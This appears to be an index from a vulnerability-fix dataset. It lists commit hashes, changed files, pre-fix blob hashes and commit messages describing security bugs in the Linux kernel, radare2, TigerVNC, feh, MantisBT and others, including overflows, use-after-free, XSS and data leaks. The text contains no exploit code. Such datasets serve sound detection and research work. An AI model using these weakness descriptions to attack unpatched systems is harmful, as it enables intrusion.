    0-T-0_ps4-linux
Commit Message for 1ebb71143758f45dc0fa76e2f48429e13b16d110:
HID: hid-cypress: validate length of report\n\nMake sure we have enough of a report structure to validate before looking at it.\n\nReported-by: Benoit Camredon <benoit.camredon@airbus.com> Tested-by: Benoit Camredon <benoit.camredon@airbus.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf
File(s) In Commit: 
    libr/util/r_pkcs7.c
Blob(s) In Commit: 
    467f58fa729a43d2970010ada7f5eee36d6815d4
Blob(s) Before Fix: 
    0a8d5643e5403e7fca6152573cb746a54ac7efa4
    67ae652a3a837bea819684d89a126cd55e7d9faf
    765fe6f0e2a1a682aa84c30fa61389cffc5c4300
    a1f50c19e8e3ca2701015f001de82b84ea21ace3
Projects:
    0-T-0_radare2
Commit Message for 7ab66cca5bbdf6cb2d69339ef4f513d95e532dbf:
Fix #7152 - Null deref in cms\n\n

======================================================================
Commit With Fix: 
    bf3bdac082978ca32895a4b6a123016094905689
File(s) In Commit: 
    common/rfb/SMsgReader.cxx
Blob(s) In Commit: 
    3c08fd6fd58a5207fd28c2cd7ee21880e6708c88
Blob(s) Before Fix: 
    89c9a8fdefcdf9c0216e2de24230ae6d54841733
Projects:
    0019_tigervnc
Commit Message for bf3bdac082978ca32895a4b6a123016094905689:
Fix crash from integer overflow in SMsgReader::readClientCutText\n\nThe length sent by client is U32, but is converted into int. If it was bigger than 0x7fffffff the resulting int is negative, it passes the check against maxCutText and later throws std::bad_alloc from CharArray which takes down the whole server.\n\nAll the Streaming API deals with lengths in ints, so we can't tell it to skip that big amount of data. And it is not realistic to expect more than 2GB of clipboard data anyway. So lets just throw rdr::Exception that will disconnect this client and keep the server alive.

======================================================================
Commit With Fix: 
    ee0d8d8482345ff97a75a7d747efc309f13b0d80
File(s) In Commit: 
    net/ipx/af_ipx.c
Blob(s) In Commit: 
    fa31ef29e3fa0bf3973e12e43c57b48eb7d1be45
Blob(s) Before Fix: 
    00b2a6d1c0092a7d0ec668b0b657f520637f31cd
    1b095ca37aa46bd86a534a5d7eff4824d65b2ef2
    48d0dc89b58de8aae5f128145634070a77d7c281
    4ea5d7497b5f29ac41a00783c48d1898aa769937
    5138aa531102f86bff101be33d3254d061681085
    7a1e0fc1bd4dd2ca8f31d8a376d94a30406cb1e1
    85b827c39c9f8fe2505e3266ea3c59ad3e18010a
    8a9219ff2e77e0205de652974a44c5e4ba33b2c0
    91729b807c7d041ae379e89df335acefe5218635
    ac598ec905894b7b2b45ee67aba5c4cfd94fc24c
    e096025b477f39c43ce65ddb8584193491bd62c1
    e735f781e4f327a9c47a13e29fd70734f8a1d180
    f11ad1d95e0e6e88294003fee338743863daa443
    f547a47d381ca0596244bfbf692ef8134b508ccc
Projects:
    0-T-0_ps4-linux
Commit Message for ee0d8d8482345ff97a75a7d747efc309f13b0d80:
ipx: call ipxitf_put() in ioctl error path\n\nWe should call ipxitf_put() if the copy_to_user() fails.\n\nReported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    06bd3c36a733ac27962fea7d6f47168841376824
File(s) In Commit: 
    fs/ext4/inode.c
Blob(s) In Commit: 
    250c2df04a92c5feee85c6e07c75940dc0af5392
Blob(s) Before Fix: 
    981a1fc30eaa2c291c97958ce088e3ce96ab4353
    e6218cbc8332e0ff57ff9b6a939dae1a8f8412ba
Projects:
    0-T-0_ps4-linux
Commit Message for 06bd3c36a733ac27962fea7d6f47168841376824:
ext4: fix data exposure after a crash\n\nHuang has reported that in his powerfail testing he is seeing stale block contents in some of recently allocated blocks although he mounts ext4 in data=ordered mode. After some investigation I have found out that indeed when delayed allocation is used, we don't add inode to transaction's list of inodes needing flushing before commit. Originally we were doing that but commit f3b59291a69d removed the logic with a flawed argument that it is not needed.\n\nThe problem is that although for delayed allocated blocks we write their contents immediately after allocating them, there is no guarantee that the IO scheduler or device doesn't reorder things and thus transaction allocating blocks and attaching them to inode can reach stable storage before actual block contents. Actually whenever we attach freshly allocated blocks to inode using a written extent, we should add inode to transaction's ordered inode list to make sure we properly wait for block contents to be written before committing the transaction. So that is what we do in this patch. This also handles other cases where stale data exposure was possible - like filling hole via mmap in data=ordered,nodelalloc mode.\n\nThe only exception to the above rule are extending direct IO writes where blkdev_direct_IO() waits for IO to complete before increasing i_size and thus stale data exposure is not possible. For now we don't complicate the code with optimizing this special case since the overhead is pretty low. In case this is observed to be a performance problem we can always handle it using a special flag to ext4_map_blocks().\n\nCC: stable@vger.kernel.org Fixes: f3b59291a69d0b734be1fc8be489fef2dd846d3d Reported-by: "HUANG Weller (CM/ESW12-CN)" <Weller.Huang@cn.bosch.com> Tested-by: "HUANG Weller (CM/ESW12-CN)" <Weller.Huang@cn.bosch.com> Signed-off-by: Jan Kara <jack@suse.cz> Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
    8f44c9a41386729fea410e688959ddaa9d51be7c
File(s) In Commit: 
    drivers/net/wireless/broadcom/brcm80211/brcmfmac/cfg80211.c
Blob(s) In Commit: 
    7e689c86d56576cf96ca755b16107216470fccdf
Blob(s) Before Fix: 
    10098b7586f3c95de1d2a5a5abc4396f5b13e319
    15592641eaf22078773aeda5e8866fdd9d12e48c
    210f2dc58b74a08f3893c06a1a05d364e4045c99
    2628d5e12c6424b657b7dd9138c277ef0a9d5d47
    4157c90ad9736b9b20ab086585eca22ff80a60c9
    617199c0e5a0e644576b3c73be0808878d4c102b
    62f475e31077ca1fa1df15863f02ee0911c46997
    78d9966a3957b2b934fe6b21de5cade494ec2839
    7b01e4ddb315b70ca0432371ecdb695808c2a4ac
    7ffc4aba5bab0683fe993d1d5eef9e8e3d8389d0
    8ee8af4e7ec4f3270faf0d47a47a86b1dc849716
    944b83cfc51978d06ccc82a9f23ce64472af3fc8
    b777e1b2f87aeb06d6c1b527b1b92aee744dd2e1
    b8f042146fc9b7befa896b01e346303c5f1ef347
    cd1d6730eab73d514db5a1b88d442607c7834e3d
    dcde596c9eb9c3fa875c2675318f0298e118549a
Projects:
    0-T-0_ps4-linux
Commit Message for 8f44c9a41386729fea410e688959ddaa9d51be7c:
brcmfmac: fix possible buffer overflow in brcmf_cfg80211_mgmt_tx()\n\nThe lower level nl80211 code in cfg80211 ensures that "len" is between 25 and NL80211_ATTR_FRAME (2304).  We subtract DOT11_MGMT_HDR_LEN (24) from "len" so thats's max of 2280.  However, the action_frame->data[] buffer is only BRCMF_FIL_ACTION_FRAME_SIZE (1800) bytes long so this memcpy() can overflow.\n\n	memcpy(action_frame->data, &buf[DOT11_MGMT_HDR_LEN], 	       le16_to_cpu(action_frame->len)) \n\nCc: stable@vger.kernel.org # 3.9.x Fixes: 18e2f61db3b70 ("brcmfmac: P2P action frame tx.") Reported-by: "freenerguo(郭大兴)" <freenerguo@tencent.com> Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6399f1fae4ec29fab5ec76070435555e256ca3a6
File(s) In Commit: 
    net/ipv6/output_core.c
Blob(s) In Commit: 
    abb2c307fbe8337ce1714e7392072c945ed5af51
Blob(s) Before Fix: 
    462f2a76b5c2270dba806e193a4c5bde57e14a39
    4fe7c90962ddae3356200376aa911bab6d75bb48
    5ec867e4a8b74fb23d8fdd2bcf9e0dce52f94455
    7cca8ac66fe9b07a9f91559667c057113ccc3c19
    928a0fb0b74406cdf32c89fe7db054b40476dc54
    97f41a3e68d98b89d6b8f643780f8a883bd46f55
    a338bbc33cf3cd895fa77e137d6f6389e9a6519c
    cd4252346a32d90e8e133bd985811b6241e4bcd7
    e9065b8d3af852c6e9a7359667f68a5ad00bfe75
Projects:
    0-T-0_ps4-linux
Commit Message for 6399f1fae4ec29fab5ec76070435555e256ca3a6:
ipv6: avoid overflow of offset in ip6_find_1stfragopt\n\nIn some cases, offset can overflow and can cause an infinite loop in ip6_find_1stfragopt(). Make it unsigned int to prevent the overflow, and cap it at IPV6_MAXPLEN, since packets larger than that should be invalid.\n\nThis problem has been here since before the beginning of git history.\n\nSigned-off-by: Sabrina Dubroca <sd@queasysnail.net> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a69f32175c28af1b34e5df83000f830e60f6bce9
File(s) In Commit: 
    phpmyfaq/inc/PMF/Faq.php
Blob(s) In Commit: 
    1c7ac24d297ea65f8e4f7abaeff38a565fcf90a0
Blob(s) Before Fix: 
    35f401cf10173df687bcee58f1a03dbfca1172b5
Projects:
    14wind_phpMyFAQ
Commit Message for a69f32175c28af1b34e5df83000f830e60f6bce9:
Added missing sanitizing

======================================================================
Commit With Fix: 
    60b234301adf258786d8b90be5c1d437fc8799e0
File(s) In Commit: 
    src/flac.c
Blob(s) In Commit: 
    40629c7d69dabf7eb97705107936d95070d6640d
Blob(s) Before Fix: 
    92029990e4cc96968aacc8c8fea7f81a7139542d
    b4c665d33643c6ca1d323a6f835926534510b0bf
Projects:
    12gjang_libsndfile
Commit Message for 60b234301adf258786d8b90be5c1d437fc8799e0:
src/flac.c: Improve error handling\n\nEspecially when dealing with corrupt or malicious files.

======================================================================
Commit With Fix: 
    cf01fb9985e8deb25ccf0ea54d916b8871ae0e62
File(s) In Commit: 
    mm/mempolicy.c
Blob(s) In Commit: 
    37d0b334bfe9f09222a9626a99b91f4bfca9d784
Blob(s) Before Fix: 
    04729647f359c7c1fa3a91058cc1044c0db2df8d
    0b859af06b87df4e17af4180b953a6337c251dff
    0cd2c4d4e2703f88f56b957b6f442a531fbd2e1f
    0e0961b8c39ceb18a7eca485753d1a74c905d353
    1e7873e40c9a16e922d4800e6dc41486eee23540
    23471526d4246ec8c6b5c8180744d20b6152b502
    284974230459728b2ec92f4afdc9e49a4e03ec21
    297d6854f84920f4420d5929fd3bc1084dd8a15e
    2da72a5b6ecc04f87bd9168fc31d613360e40f2e
    2e346645eb80d6bb8f97761c30aed6a512017e59
    36cc01bc950a6e5f8ef94c0d0506f463e01791d9
    4721046a134a6b8c6ab177c92cebbc67da02dc9d
    4c4187c0e1deeb25bdbf5eb383132d27feb9be90
    618ab125228baec0810146a0638ce80ce4d50284
    6d3639e1f254734ae62b13a04fb78c2153f1c7ba
    74310017296ee02317b79a2c28b25ef303fc7720
    747743237d9f4d3ead6117d4ee152c00659cd362
    75b2745bac4145933a5b969e7b8b2a36fc73d45d
    7d8e56214ac099ad7c0a1eb8201d344a008428f1
    87a177917cb2e60a13b09e6a53836ccd9f9275bf
    8cbc74387df38c5572001bd2e06bd8da1af5ab70
    8f5330d74f47bded6c1119b49fe34c2ba2573029
    99d4c1d0b8583dc453ef992582074ef015f1fb49
    ad1c96ac313c0f442b1635baaa96555d355a74bb
    ae3c8f3595d4ff522f0427b05ace2f7e041da8ad
    b25de27b83d02087a135ee2e9b66ffa283e9fe46
    d8c4e38fb5f4be1d9748dc77f214c8a285374f8d
    dc8a2672c407c7b1801eede98ee52bfd6c52367f
    e58725aff7e999aeecde0e332960c498aa786128
    eb58de19f815d07adaa0a0485308dd0095d39423
    ede26291d4aa92ad120bfd006786414fd6d45c56
    f6204627b4abd0b55ff3791d0be82b68d78bbdb0
Projects:
    0-T-0_ps4-linux
Commit Message for cf01fb9985e8deb25ccf0ea54d916b8871ae0e62:
mm/mempolicy.c: fix error handling in set_mempolicy and mbind.\n\nIn the case that compat_get_bitmap fails we do not want to copy the bitmap to the user as it will contain uninitialized stack data and leak sensitive data.\n\nSigned-off-by: Chris Salls <salls@cs.ucsb.edu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    e6838a29ecb484c97e4efef9429643b9851fba6e
File(s) In Commit: 
    fs/nfsd/nfssvc.c
Blob(s) In Commit: 
    59979f0bbd4bf255f5ea6f8fbd33cb9b2a5aa073
Blob(s) Before Fix: 
    063ae7de2c12245fdce41a8b72d97003490fa69f
    1645b977c9c6ae7c6d24c072ec90a785a0ad3452
    1879e43f2868c7ffbf21405f41412d2f540f19f7
    262df5ccbf59db0c4fd516a30fa721945b55f600
    314f5c8f8f1a9cfdef6cc075a9c4bb5350deec9b
    31e1f959345715a59f8f6b9d9ec00a0ec00fece5
    45007acaf364686f58eb5242350e06a9e24e239c
    752d56bbe0ba47cda7ed87cb724130944879d269
    760c85a6f534a45b0eb396a62acc305484163109
    786a4a2cb2d7a96cbde629c17b6ac58ab82bc84e
    89cb484f1cfbeccde41d872298c7e08aaadd5b87
    9277cc91c21b051011c4dbfe4d677b32d37ad37f
    9a4a5f9e7468748f7195ac92f86d7317c83e0822
    a2b65fc56dd662ee39a9023d322b5a6131cc8d8c
    ad4e2377dd636cf893e7a02e61565730207045c5
    e6bfd96734c006587bd1709d0df48818c2065789
Projects:
    0-T-0_ps4-linux
Commit Message for e6838a29ecb484c97e4efef9429643b9851fba6e:
nfsd: check for oversized NFSv2/v3 arguments\n\nA client can append random data to the end of an NFSv2 or NFSv3 RPC call without our complaining  we'll just stop parsing at the end of the expected data and ignore the rest.\n\nEncoded arguments and replies are stored together in an array of pages, and if a call is too large it could leave inadequate space for the reply.  This is normally OK because NFS RPC's typically have either short arguments and long replies (like READ) or long arguments and short replies (like WRITE).  But a client that sends an incorrectly long reply can violate those assumptions.  This was observed to cause crashes.\n\nAlso, several operations increment rq_next_page in the decode routine before checking the argument size, which can leave rq_next_page pointing well past the end of the page array, causing trouble later in svc_free_pages.\n\nSo, following a suggestion from Neil Brown, add a central check to enforce our expectation that no NFSv2/v3 call has both a large call and a large reply.\n\nAs followup we may also want to rewrite the encoding routines to check more carefully that they aren't running off the end of the page array.\n\nWe may also consider rejecting calls that have any extra garbage appended.  That would be safer, and within our rights by spec, but given the age of our server and the NFS protocol, and the fact that we've never enforced this before, we may need to balance that against the possibility of breaking some oddball client.\n\nReported-by: Tuomas Haanpää <thaan@synopsys.com> Reported-by: Ari Kauppi <ari@synopsys.com> Cc: stable@vger.kernel.org Reviewed-by: NeilBrown <neilb@suse.com> Signed-off-by: J. Bruce Fields <bfields@redhat.com>

======================================================================
Commit With Fix: 
    d2632f6483a3ceb5d8e0a5fb11142c51c43978b4
File(s) In Commit: 
    libr/bin/format/wasm/wasm.c
Blob(s) In Commit: 
    4df4802ed2dbd8a0e7d39b4e58a2a9e2cf74dc16
Blob(s) Before Fix: 
    a950737fc8a621c63e7598ad27bbe7693bd17fd9
Projects:
    0-T-0_radare2
Commit Message for d2632f6483a3ceb5d8e0a5fb11142c51c43978b4:
Fix crash in fuzzed wasm r2_hoobr_consume_init_expr

======================================================================
Commit With Fix: 
    f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d
File(s) In Commit: 
    src/wallpaper.c
Blob(s) In Commit: 
    93994b3d6a9f34cea681de98192119e35faa661e
Blob(s) Before Fix: 
    a11a50de081071220c5667dbc5ade1eb9b6f9697
Projects:
    0ion9_feh
Commit Message for f7a547b7ef8fc8ebdeaa4c28515c9d72e592fb6d:
Fix double-free/OOB-write while receiving IPC data\n\nIf a malicious client pretends to be the E17 window manager, it is possible to trigger an out of boundary heap write while receiving an IPC message.\n\nThe length of the already received message is stored in an unsigned short, which overflows after receiving 64 KB of data. It's comparably small amount of data and therefore achievable for an attacker.\n\nWhen len overflows, realloc() will either be called with a small value and therefore chars will be appended out of bounds, or len + 1 will be exactly 0, in which case realloc() behaves like free(). This could be abused for a later double-free attack as it's even possible to overwrite the free information -- but this depends on the malloc implementation.\n\nSigned-off-by: Tobias Stoeckmann <tobias@stoeckmann.org>

======================================================================
Commit With Fix: 
    a1c719313d61b07bbe8700005807b8195fdc32f1
File(s) In Commit: 
    core/timeline_inc.php
Blob(s) In Commit: 
    952711677d189a9262d1c722b458a5e78640b12c
Blob(s) Before Fix: 
    40fe83037c20e97d9d0d7ab0f2e670108c7c79c4
Projects:
    01-Scripts_mantisbt
Commit Message for a1c719313d61b07bbe8700005807b8195fdc32f1:
Fix XSS in timeline_inc.php\n\nUse of $_SERVER['PHP_SELF'] and outputting it as-is allows an attacker to inject arbitrary JavaScript as part of the URL.\n\nUsing SCRIPT_NAME and passing it through string_sanitize_url() instead prevents the attack.\n\nFixes #22742 Fixes https://github.com/mantisbt/mantisbt/pull/1094

======================================================================
Commit With Fix: 
    d1e8ac62c6d978d4662f69116e30230d43033c92
File(s) In Commit: 
    libr/bin/format/mach0/mach0.c
Blob(s) In Commit: 
    398a44b15289f997c25c6e7d9c2dd50129bb62e4
Blob(s) Before Fix: 
    206ab1157078c67521627a3ba9c5d7d099a84f47
    35344e124ef21d6443e84547ce2b64706857bc3a
Projects:
    0-T-0_radare2
Commit Message for d1e8ac62c6d978d4662f69116e30230d43033c92:
Fix null deref and uaf in mach0 parser

======================================================================
Commit With Fix: 
    67b0503db9c29b04eadfeede6bebbfe5ddad94ef
File(s) In Commit: 
    drivers/media/usb/dvb-usb/dvb-usb-firmware.c
Blob(s) In Commit: 
    04033efe7ad5394d4fd9493ce6b790de1404666b
Blob(s) Before Fix: 
    15c153e49382d0c878e76d53cdd35789672ccdd3
    42c207aacbb12ce90e0ea9d4cfce46996dcd93f8
    431bd200974b4859c720a0a2cb3b49716916d326
    733a7ff7b207819bcd05f2a816388fa21e9f69b5
    ab9866024ec7983d597efd157476820222ad8134
    b8d2ac5833e93979bd224b2dc12ee78c89dd4ca5
    dd048a7c461c8ffe1884b52ca80ff2b35233adaf
    f0023dbb72761641112ac7b0bfcba51cf154eda2
Projects:
    0-T-0_ps4-linux
Commit Message for 67b0503db9c29b04eadfeede6bebbfe5ddad94ef:
[media] dvb-usb-firmware: don't do DMA on stack\n\nThe buffer allocation for the firmware data was changed in commit 43fab9793c1f ("[media] dvb-usb: don't use stack for firmware load") but the same applies for the reset value.\n\nFixes: 43fab9793c1f ("[media] dvb-usb: don't use stack for firmware load") Cc: stable@vger.kernel.org Signed-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    606142af57dad981b78707234cfbd15f9f7b7125
File(s) In Commit: 
    drivers/media/usb/dvb-usb/dw2102.c
Blob(s) In Commit: 
    4f42d57f81d9541d25f02af65086f6465af90728
Blob(s) Before Fix: 
    14ef25dc6cd33076a288573ba413eb4e7ded6454
    1a3df10d6bad5e1c1354874c8d715a7f6e5629c0
    2c720cb2fb00f0ddecd0eb82c6daf0f3a6731094
    49b55d7069b129c4b399fcc6da2db7335f59c911
    5fb0c650926e3561684981013cc004a17975a290
    6ca502d834b4f2cfcc0e6c6a3699bdaaea04d293
    6d0dd859d68486494ae8b2d64de8a24aaed4570e
    71b22f5a05ce5ba2722f367b0cd8a9ee265df93d
    ae0f56a32e4d0ba888b09a214492cb2b2f14b244
    f1f357f43ff03663b1d606502dbcd3c250bcd16b
Projects:
    0-T-0_ps4-linux
Commit Message for 606142af57dad981b78707234cfbd15f9f7b7125:
[media] dw2102: don't do DMA on stack\n\nOn Kernel 4.9, WARNINGs about doing DMA on stack are hit at the dw2102 driver: one in su3000_power_ctrl() and the other in tt_s2_4600_frontend_attach().\n\nBoth were due to the use of buffers on the stack as parameters to dvb_usb_generic_rw() and the resulting attempt to do DMA with them.\n\nThe device was non-functional as a result.\n\nSo, switch this driver over to use a buffer within the device state structure, as has been done with other DVB-USB drivers.\n\nTested with TechnoTrend TT-connect S2-4600.\n\n[mchehab@osg.samsung.com: fixed a warning at su3000_i2c_transfer() that  state var were dereferenced before check 'd'] Signed-off-by: Jonathan McDowell <noodles@earth.li> Cc: <stable@vger.kernel.org> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    3f190e3aec212fc8c61e202c51400afa7384d4bc
File(s) In Commit: 
    drivers/media/usb/dvb-usb/cxusb.c
Blob(s) In Commit: 
    51620e02292f588b6643862c3207aa6d5cd75948
Blob(s) Before Fix: 
    20e345d9fe8f3aca89a913f79f3ccb813b7d5ab4
    243403081fa53f2860a5b67469593b5ecffae62a
    5d7b4eaa6a3c93e57000fcd398f35865b29f99b4
    643d88f95b391287862720844ee67822eb81efc6
    907ac01ae2979a56657e6ddc32fafecfbb9c9042
    99a3f36259447077557da6920526716ee1e0ad96
    9b8771eb31d44d87515d82ca7f69fbd04b6efec3
    9fd43a37154cedb24576903a5e2eceae99719227
    a10961948f8cfe07c94e453f0e689abc2baa5e68
    a1c641e18362ad288ebd1972c389831d2abb1db3
    ab715118172878ff52c8ba3e1002ec2357971a8c
    abece57aa2eabfcc2edae647b06fe75d204c200c
    f327c49d7e0936baf1e529746e82166129423916
    ffc3704abdedce344d3cf0ccc9cff8a7df6762df
Projects:
    0-T-0_ps4-linux
Commit Message for 3f190e3aec212fc8c61e202c51400afa7384d4bc:
[media] cxusb: Use a dma capable buffer also for reading\n\nCommit 17ce039b4e54 ("[media] cxusb: don't do DMA on stack") added a kmalloc'ed bounce buffer for writes, but missed to do the same for reads. As the read only happens after the write is finished, we can reuse the same buffer.\n\nAs dvb_usb_generic_rw handles a read length of 0 by itself, avoid calling it using the dvb_usb_generic_read wrapper function.\n\nSigned-off-by: Stefan Brüns <stefan.bruens@rwth-aachen.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    005145378c9ad7575a01b6ce1ba118fb427f583a
File(s) In Commit: 
    drivers/media/usb/dvb-usb-v2/dvb_usb_core.c
Blob(s) In Commit: 
    955fb0d075070a2ee62b0afa698268049fd90f09
Blob(s) Before Fix: 
    086792055912b3dad9224126ee58d511f9f787ab
    096bb75a24e52351e919e65262399a065f08a6b1
    1950f37df835187c0ac0e153231b316adcaea106
    19f6737d98173e006b47706d2a71bcec2287f365
    298c91a6f1f96bd6adb2b055a4e1ee7c7d8aabb7
    2bf3bd81280aa91870cff8fb27bf13820816ec06
    2e90310be2afd7d9ae954b63c55301ae5d25bac0
    3fbb2cd19f5e2a2e145d5d3860d3e5c04354b91c
    8a054d66e708449ce6417135eaf4e20e675ac3aa
    955318ab7f5e31c65b698a68b0a1f3581686966e
    9913e0f59485ef5b120d3e7627878f8da06d186f
    a8e6624fbe8347fb48055d0048cd4bf84575edc1
    a9bb2dde98ea3911eca805696b549470a1225561
    e35580618936cd62e8a3bbd3ec54e50ebd7cc211
    e5e056bf9dfa4b29b24f53aba0a8968d951a52bd
    f0565bf3673e8687ba16599aafc59152ad85f1da
    f5df9eaba04fb0843e40bb26555aec4eb8c0c641
Projects:
    0-T-0_ps4-linux
Commit Message for 005145378c9ad7575a01b6ce1ba118fb427f583a:
[media] dvb-usb-v2: avoid use-after-free\n\nI ran into a stack frame size warning because of the on-stack copy of the USB device structure:\n\ndrivers/media/usb/dvb-usb-v2/dvb_usb_core.c: In function 'dvb_usbv2_disconnect': drivers/media/usb/dvb-usb-v2/dvb_usb_core.c:1029:1: error: the frame size of 1104 bytes is larger than 1024 bytes [-Werror=frame-larger-than=]\n\nCopying a device structure like this is wrong for a number of other reasons too aside from the possible stack overflow. One of them is that the dev_info() call will print the name of the device later, but AFAICT we have only copied a pointer to the name earlier and the actual name has been freed by the time it gets printed.\n\nThis removes the on-stack copy of the device and instead copies the device name using kstrdup(). I'm ignoring the possible failure here as both printk() and kfree() are able to deal with NULL pointers.\n\nSigned-off-by: Arnd Bergmann <arnd@arndb.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@s-opensource.com>

======================================================================
Commit With Fix: 
    3b30460c5b0ed762be75a004e924ec3f8711e032
File(s) In Commit: 
    crypto/ccm.c
Blob(s) In Commit: 
    1ce37ae0ce565a130962f50244f331117fe965d8
Blob(s) Before Fix: 
    003bbbd21a2ba9a24f4207f20037d5ee75593726
    006d8575ef5c71b5ca5f43f35c93a636ce74c618
    0a083342ec8cf3b17c4da15c515c8c3d7a519a0f
    1df84217f7c9320dbfc5174f91ce394667c36447
    26b924d1e5826d5779e28905e8f7ac2622df2749
    442848807a52b17c3296f776890ecea469592364
    499c91717d937bfaba9364a5bcde94988626195c
    8c24605c791e29e21b6634dd3820275ea793159b
    a4d1a5eda18b4e9758ec899fdf48c6f1359a8c14
    cc31ea4335bf3640b25499cb3b5aea21e65ae778
    ed009b77e67d1e99b771834fe55bb1950e3c529c
Projects:
    0-T-0_ps4-linux
Commit Message for 3b30460c5b0ed762be75a004e924ec3f8711e032:
crypto: ccm - move cbcmac input off the stack\n\nCommit f15f05b0a5de ("crypto: ccm - switch to separate cbcmac driver") refactored the CCM driver to allow separate implementations of the underlying MAC to be provided by a platform. However, in doing so, it moved some data from the linear region to the stack, which violates the SG constraints when the stack is virtually mapped.\n\nSo move idata/odata back to the request ctx struct, of which we can reasonably expect that it has been allocated using kmalloc() et al.\n\nReported-by: Johannes Berg <johannes@sipsolutions.net> Fixes: f15f05b0a5de ("crypto: ccm - switch to separate cbcmac driver") Signed-off-by: Ard Biesheuvel <ard.biesheuvel@linaro.org> Tested-by: Johannes Berg <johannes@sipsolutions.net> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    c919a3069c775c1c876bec55e00b2305d5125caa
File(s) In Commit: 
    drivers/net/can/usb/gs_usb.c
Blob(s) In Commit: 
    a0dabd4038ba350c6b26f2a53834cb342c17da46
Blob(s) Before Fix: 
    04b0f84612f0cf12fd1cfc59925a60c448423fa2
    05369dc9dd09ae1dc051a1659acb23ee0d42aa66
    6f0cbc38782e68ac41275c89ea5cea1e534cf35e
    77e3cc06a30c8cb970b6afef41352a15716c9331
Projects:
    0-T-0_ps4-linux
Commit Message for c919a3069c775c1c876bec55e00b2305d5125caa:
can: gs_usb: Don't use stack memory for USB transfers\n\nFixes: 05ca5270005c can: gs_usb: add ethtool set_phys_id callback to locate physical device\n\nThe gs_usb driver is performing USB transfers using buffers allocated on the stack. This causes the driver to not function with vmapped stacks. Instead, allocate memory for the transfer buffers.\n\nSigned-off-by: Ethan Zonca <e@ethanzonca.com> Cc: linux-stable <stable@vger.kernel.org> # >= v4.8 Signed-off-by: Marc Kleine-Budde <mkl@pengutronix.de>

======================================================================
Commit With Fix: 
    c4baad50297d84bde1a7ad45e50c73adae4a2192
File(s) In Commit: 
    drivers/char/virtio_console.c
Blob(s) In Commit: 
    e9b7e0b3cabe60d3be3ab8a092159b137854d8ec
Blob(s) Before Fix: 
    17857beb489294b2c1b5bbd068a18ba013ab3fae
    50754d2033100851b87f78d06401a3c5c137262d
    5649234b73162aaefcb0d74a5f7b9ec4820be486
    5da47e26a0124262734357853eb8290d6e817712
    60aafb8a1f2e24d38993aa57c114f913d5524735
    6266c0568e1d0a3e6526723a66490c932216fb56
    72d7028f779b55801795ef0fe49d9dda8cde7970
    8b00e79c2683a4812126fb73c7134ea157554ef2
    cf7a561fad7cd9f3cdd94fe16e5c22d65318428c
    d2406fe2553396a807a169ddd93b656a4876a537
    d433b1db1fdd79469ae7b744cf8f2514c3a0fab0
    ee9a0f50ef9a0fd2c5d49b9edefd478c8da99b91
    fc45567ad3acef079db496c9a2f495e19e5b5bba
Projects:
    0-T-0_ps4-linux
Commit Message for c4baad50297d84bde1a7ad45e50c73adae4a2192:
virtio-console: avoid DMA from stack\n\nput_chars() stuffs the buffer it gets into an sg, but that buffer may be on the stack. This breaks with CONFIG_VMAP_STACK=y (for me, it manifested as printks getting turned into NUL bytes).\n\nSigned-off-by: Omar Sandoval <osandov@fb.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com> Reviewed-by: Amit Shah <amit.shah@redhat.com>

======================================================================
Commit With Fix: 
    5593523f968bc86d42a035c6df47d5e0979b5ace
File(s) In Commit: 
    drivers/net/usb/pegasus.c
Blob(s) In Commit: 
    36674484c6fb9b73011619824f7bc60c50b9c1ad
Blob(s) Before Fix: 
    03e8a15d7deb74d328d5e563ed2077f62c8d9687
    1434e5dd5f9cd2c859ed7a54e4fb2267c8420654
    24e803fe9a534c2e23dee6418496dd2755ff8de9
    2f531141933b90f76da1bd23661bc46f51cb9518
    399f7ee57aead0db2b7a5de51d245020bc21b4b8
    6514c86f043eeb8777354094c4d2fd9f2ffd9c9d
    82129eef77748f25ffe05f4754f4f6df81e3e8cd
    9bbe0161a2f45090fe0de085025fc2c91bf60fc8
    ee40ac23507a083356e66d4fc0a43a7b11465b06
    f840802159158b56a5b840d7abb83152fcd0c83f
Projects:
    0-T-0_ps4-linux
Commit Message for 5593523f968bc86d42a035c6df47d5e0979b5ace:
pegasus: Use heap buffers for all register access\n\nAllocating USB buffers on the stack is not portable, and no longer works on x86_64 (with VMAP_STACK enabled as per default).\n\nFixes: 1da177e4c3f4 ("Linux-2.6.12-rc2") References: https://bugs.debian.org/852556 Reported-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Tested-by: Lisandro Damián Nicanor Pérez Meyer <lisandro@debian.org> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7926aff5c57b577ab0f43364ff0c59d968f6a414
File(s) In Commit: 
    drivers/net/usb/rtl8150.c
Blob(s) In Commit: 
    c81c79110cefca9443d614679d8e7cdd4b3295c3
Blob(s) Before Fix: 
    0a090290454ce3ceea7cb51c46fc37845fb43af4
    39672984dde1de8b8fa2f317752d53ce3e79b9ed
    6cbdac67f3a0d3f899b0a3ca783d427b2e1c9704
    6e87e5710048cf952c1505950d954a493b6b8878
